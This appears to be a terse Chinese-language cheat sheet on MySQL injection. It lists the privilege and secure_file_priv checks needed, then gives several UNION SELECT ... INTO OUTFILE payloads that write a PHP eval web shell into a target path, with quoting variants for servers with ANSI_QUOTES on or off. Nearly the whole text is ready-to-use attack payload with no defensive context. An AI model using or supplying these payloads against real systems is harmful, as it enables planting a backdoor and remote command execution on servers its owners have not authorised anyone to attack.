前提条件:
select user()查找当前用户名
load_file('绝对路径');读取文件内容返回
select file_priv from mysql.user where user='当前用户名';查看是否有FILE权限
SELECT @@secure_file_priv;
查看mysql的secure_file_priv参数值,如果值为NULL则不限制全局导入,如果值为某个路径则只能导入到该路径下
1:mysql不限制全局导入
2:知道目标绝对物理路径
3:当前数据库用户有导入权限
$GET_[]参数默认不开启ANSI_QUOTES,双引号也具有隔断效果,可以把内外单双引号调换位置,或直接用不同引号包裹,用引号包裹会打乱隔断结构导致出错
-- select * from user where id=1 union select 1,2,'<?php eval($_GET[cmd]); ?>' into outfile '目标路径'
-- select * from user where id=1 union select 1,2,"<?php eval($_GET[cmd]); ?>" into outfile '目标路径'
-- select * from user where id=1 union select 1,2,"<?php eval($_GET['cmd']); ?>" into outfile '目标路径'
如果qsl开启ANSI_QUOTES,单双引号作用不同,外部只能用单引号,但可以在单引号内部写双引号
-- select * from user where id=1 union select 1,2,'<?php eval($_GET["cmd"]) ?>' into outfile '目标路径'
